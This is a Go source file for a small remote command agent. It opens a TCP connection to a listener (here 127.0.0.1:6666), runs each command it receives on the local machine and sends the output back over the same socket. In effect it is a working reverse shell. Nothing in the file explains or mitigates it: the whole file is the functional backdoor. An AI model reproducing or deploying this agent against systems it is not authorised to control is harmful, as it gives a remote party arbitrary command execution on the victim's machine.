package main

import (
	"fmt"
	"io/ioutil"
	"log"
	"net"
	"os/exec"
	"strings"
)

type worker interface {
	startServer() bool
	exeCmd(string, chan bool)
	working()
	shutdown()
}

type agent struct {
	remoteAddr string
	conn       net.Conn
	retry      int
}

func (ag *agent) startServer() bool {
	conn, err := net.Dial("tcp", ag.remoteAddr)
	if err != nil {
		log.Fatalln(err)
		return false
	}
	ag.conn = conn
	return true
}

func (ag *agent) exeCmd(commad string, msg chan bool) {
	defer func() {
		msg <- false
	}()
	realcmd := strings.Split(strings.Replace(commad, "\r\n", "", -1), " ")
	cmds := exec.Command(realcmd[0], realcmd[1:]...)
	stdout, err := cmds.StdoutPipe()
	if err != nil {
		log.Println("cmd err :", err)
	}
	defer stdout.Close()
	if err := cmds.Start(); err != nil {
		log.Println("cmd start :", err)
	}
	opBytes, err := ioutil.ReadAll(stdout)
	if err != nil {
		log.Println(err)
	}

	_, er := ag.conn.Write(opBytes)

	if er != nil {
		log.Fatalln("exeCmd write err", er)
	}
}

func (ag *agent) working() {
	buffer := make([]byte, 1024)
	msg := make(chan bool)
	for {
		n, err := ag.conn.Read(buffer)
		if err != nil {
			log.Fatalln("working read err:", err)
		}

		if n > 0 {
			go ag.exeCmd(string(buffer[:n]), msg)
			<-msg
		}
	}
}

func (ag *agent) shutdown() {
	if ag.conn != nil {
		er := ag.conn.Close()
		log.Println("shutdown err :", er)
	}
}

func main() {

	fmt.Println("go pass agent start")
	ag1 := &agent{remoteAddr: "127.0.0.1:6666", retry: 10}
	init := ag1.startServer()
	if init == false {
		log.Fatalln("connect start fail!!!!")
	}
	defer ag1.shutdown()
	ag1.working()
}
